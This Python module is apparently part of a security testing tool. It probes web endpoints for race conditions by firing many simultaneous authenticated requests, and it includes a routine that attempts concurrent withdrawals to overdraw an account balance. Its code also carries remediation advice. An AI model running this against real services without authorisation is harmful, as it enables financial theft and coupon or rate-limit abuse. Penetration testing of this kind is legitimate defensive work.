# janus/attack/race_condition.py
"""
Race Condition Tester - The "Time-Lord" Module.
Tests for Time-of-Check to Time-of-Use (TOCTOU) vulnerabilities.

Risk: Race conditions can allow attackers to:
- Withdraw more money than their balance
- Use a single coupon multiple times
- Bypass rate limiters
- Cause data corruption

This is an advanced logic flaw that requires precise timing.

OWASP: Business Logic Vulnerabilities
"""

import asyncio
import time
from typing import Dict, List, Any, Optional, Callable
from dataclasses import dataclass, asdict
from datetime import datetime
import json

try:
    import aiohttp
    AIOHTTP_AVAILABLE = True
except ImportError:
    AIOHTTP_AVAILABLE = False
    print("[!] aiohttp not installed. Install with: pip install aiohttp")


@dataclass
class RaceConditionResult:
    """Result of a race condition test."""
    endpoint: str
    vulnerable: bool
    severity: str
    requests_sent: int
    successful_requests: int
    responses: List[Dict]
    timing_spread_ms: float  # How close together the requests were
    evidence: str
    recommendation: str
    
    def to_dict(self) -> Dict:
        return asdict(self)


class RaceConditionTester:
    """
    Tests for race conditions by sending multiple requests simultaneously.
    
    Attack Vector:
    - Prepare N identical requests
    - Hold them at the gate using an asyncio.Event
    - Release all at the exact same microsecond
    - Check if the server processed them all before any one completed
    
    Common Targets:
    - Financial transactions (balance updates)
    - Coupon/voucher redemption
    - Limited inventory purchases
    - Rate-limited actions
    - One-time token usage
    """
    
    def __init__(self, timeout: int = 30):
        if not AIOHTTP_AVAILABLE:
            raise ImportError("aiohttp is required for race condition testing")
        self.timeout = timeout
    
    async def _send_request(self,
                            session: aiohttp.ClientSession,
                            url: str,
                            method: str,
                            headers: Dict,
                            body: Dict,
                            start_event: asyncio.Event,
                            request_id: int) -> Dict:
        """
        Prepare and wait for the starting gun, then fire request.
        
        This coroutine waits at the Event, then all fire simultaneously.
        """
        # Wait for the starting signal
        await start_event.wait()
        
        # Record precise timing
        start_time = time.perf_counter_ns()
        
        try:
            async with session.request(
                method=method,
                url=url,
                headers=headers,
                json=body,
                timeout=aiohttp.ClientTimeout(total=self.timeout)
            ) as response:
                end_time = time.perf_counter_ns()
                
                try:
                    response_body = await response.json()
                except:
                    response_body = await response.text()
                
                return {
                    "request_id": request_id,
                    "status_code": response.status,
                    "start_time_ns": start_time,
                    "end_time_ns": end_time,
                    "duration_ms": (end_time - start_time) / 1_000_000,
                    "response": response_body,
                    "success": response.status in [200, 201, 202, 204]
                }
                
        except Exception as e:
            return {
                "request_id": request_id,
                "status_code": 0,
                "start_time_ns": start_time,
                "end_time_ns": time.perf_counter_ns(),
                "duration_ms": 0,
                "response": {"error": str(e)},
                "success": False
            }
    
    async def test_race_condition_async(self,
                                        endpoint: str,
                                        method: str = "POST",
                                        body: Dict = None,
                                        token: str = None,
                                        headers: Dict = None,
                                        threads: int = 10) -> RaceConditionResult:
        """
        Test an endpoint for race conditions.
        
        Args:
            endpoint: Full URL of the endpoint
            method: HTTP method (usually POST)
            body: Request body (same for all requests)
            token: Authorization token
            headers: Additional headers
            threads: Number of simultaneous requests (10-20 recommended)
        
        Returns:
            RaceConditionResult with timing analysis
        """
        print(f"[*] Preparing {threads} simultaneous requests to {endpoint}")
        
        request_headers = {
            'Content-Type': 'application/json',
            **(headers or {})
        }
        
        if token:
            request_headers['Authorization'] = token if 'Bearer' in token else f'Bearer {token}'
        
        # Create the starting gun
        start_event = asyncio.Event()
        
        async with aiohttp.ClientSession() as session:
            # Prepare all coroutines (they'll wait at the event)
            tasks = [
                self._send_request(
                    session, endpoint, method, request_headers, body or {},
                    start_event, i
                )
                for i in range(threads)
            ]
            
            # Start all coroutines (they wait at the event)
            gathered = asyncio.gather(*tasks)
            
            # Small delay to ensure all coroutines are ready
            await asyncio.sleep(0.01)
            
            # Fire! Release all requests at once
            print(f"[*] Firing {threads} requests simultaneously...")
            start_event.set()
            
            # Wait for all responses
            results = await gathered
        
        # Analyze results
        return self._analyze_results(endpoint, results, threads)
    
    def _analyze_results(self, 
                         endpoint: str,
                         results: List[Dict],
                         expected_threads: int) -> RaceConditionResult:
        """Analyze the race condition test results."""
        
        # Sort by start time
        results.sort(key=lambda x: x['start_time_ns'])
        
        # Calculate timing spread (how simultaneously the requests fired)
        if len(results) >= 2:
            first_start = results[0]['start_time_ns']
            last_start = results[-1]['start_time_ns']
            timing_spread_ms = (last_start - first_start) / 1_000_000
        else:
            timing_spread_ms = 0
        
        # Count successes
        successful = [r for r in results if r['success']]
        success_count = len(successful)
        
        # Determine vulnerability
        vulnerable = False
        severity = "INFO"
        evidence = ""
        
        # If all requests succeeded when only one should have
        if success_count > 1:
            # Check if responses are identical (suggests race condition)
            response_hashes = set()
            for r in successful:
                resp_str = json.dumps(r['response'], sort_keys=True)
                response_hashes.add(hash(resp_str))
            
            if len(response_hashes) == 1:
                # All successful responses are identical
                vulnerable = True
                severity = "HIGH"
                evidence = f"{success_count}/{expected_threads} requests succeeded with identical responses. " \
                          f"This suggests the server processed all requests before any one completed."
            elif success_count >= expected_threads * 0.8:
                # Most requests succeeded
                vulnerable = True
                severity = "CRITICAL"
                evidence = f"{success_count}/{expected_threads} requests succeeded (80%+). " \
                          f"High probability of race condition vulnerability."
            else:
                # Some requests succeeded, some failed
                vulnerable = True
                severity = "MEDIUM"
                evidence = f"{success_count}/{expected_threads} requests succeeded. " \
                          f"Possible race condition - verify with larger thread count."
        else:
            evidence = f"Only {success_count}/{expected_threads} requests succeeded. " \
                      f"Server appears to have proper locking/serialization."
        
        # Check for error messages indicating race condition was detected
        error_messages = [r['response'] for r in results if not r['success']]
        race_indicators = ['already', 'insufficient', 'exceeded', 'limit', 'once', 'duplicate']
        
        if any(any(ind in str(err).lower() for ind in race_indicators) for err in error_messages):
            if not vulnerable:
                evidence += " Server returned race-prevention error messages."
        
        recommendation = ""
        if vulnerable:
            recommendation = (
                "Implement proper locking mechanisms:\n"
                "1. Use database transactions with SELECT FOR UPDATE\n"
                "2. Implement optimistic locking with version numbers\n"
                "3. Use Redis SETNX for distributed locks\n"
                "4. Apply idempotency keys for financial operations"
            )
        
        return RaceConditionResult(
            endpoint=endpoint,
            vulnerable=vulnerable,
            severity=severity,
            requests_sent=expected_threads,
            successful_requests=success_count,
            responses=[{
                'id': r['request_id'],
                'status': r['status_code'],
                'duration_ms': round(r['duration_ms'], 2)
            } for r in results],
            timing_spread_ms=round(timing_spread_ms, 3),
            evidence=evidence,
            recommendation=recommendation
        )
    
    def test_race_condition(self,
                            endpoint: str,
                            method: str = "POST",
                            body: Dict = None,
                            token: str = None,
                            headers: Dict = None,
                            threads: int = 10) -> RaceConditionResult:
        """
        Synchronous wrapper for race condition testing.
        """
        return asyncio.run(
            self.test_race_condition_async(
                endpoint, method, body, token, headers, threads
            )
        )
    
    async def test_balance_exploit_async(self,
                                         withdraw_endpoint: str,
                                         balance_endpoint: str,
                                         withdraw_amount: float,
                                         token: str,
                                         threads: int = 10) -> Dict:
        """
        Specialized test for financial race conditions.
        
        Attack Scenario:
        1. Check initial balance
        2. Fire N simultaneous withdrawal requests
        3. Check final balance
        4. If final_balance < 0 or total_withdrawn > initial_balance, vulnerable
        
        Args:
            withdraw_endpoint: Endpoint to submit withdrawal
            balance_endpoint: Endpoint to check balance
            withdraw_amount: Amount to withdraw per request
            token: Auth token
            threads: Number of simultaneous requests
        """
        print(f"[*] Testing financial race condition...")
        print(f"    Withdraw: {withdraw_amount} x {threads} requests")
        
        headers = {'Authorization': token}
        
        # Get initial balance
        async with aiohttp.ClientSession() as session:
            async with session.get(balance_endpoint, headers=headers) as resp:
                initial_data = await resp.json()
        
        initial_balance = initial_data.get('balance', 0)
        print(f"[*] Initial balance: {initial_balance}")
        
        # Fire race condition
        result = await self.test_race_condition_async(
            endpoint=withdraw_endpoint,
            method="POST",
            body={"amount": withdraw_amount},
            token=token,
            threads=threads
        )
        
        # Get final balance
        async with aiohttp.ClientSession() as session:
            async with session.get(balance_endpoint, headers=headers) as resp:
                final_data = await resp.json()
        
        final_balance = final_data.get('balance', 0)
        total_withdrawn = result.successful_requests * withdraw_amount
        expected_balance = initial_balance - total_withdrawn
        
        print(f"[*] Final balance: {final_balance}")
        print(f"[*] Total withdrawn: {total_withdrawn}")
        print(f"[*] Expected balance: {expected_balance}")
        
        # Analyze financial impact
        exploit_successful = False
        if final_balance < 0:
            exploit_successful = True
            print(f"[!] CRITICAL: Negative balance achieved! Race condition exploited.")
        elif total_withdrawn > initial_balance:
            exploit_successful = True
            print(f"[!] CRITICAL: Withdrew more than available balance!")
        elif final_balance != expected_balance and result.successful_requests > 1:
            exploit_successful = True
            print(f"[!] WARNING: Balance inconsistency detected.")
        
        return {
            "vulnerable": exploit_successful or result.vulnerable,
            "severity": "CRITICAL" if exploit_successful else result.severity,
            "initial_balance": initial_balance,
            "final_balance": final_balance,
            "total_withdrawn": total_withdrawn,
            "expected_balance": expected_balance,
            "balance_discrepancy": final_balance - expected_balance,
            "race_result": result.to_dict()
        }
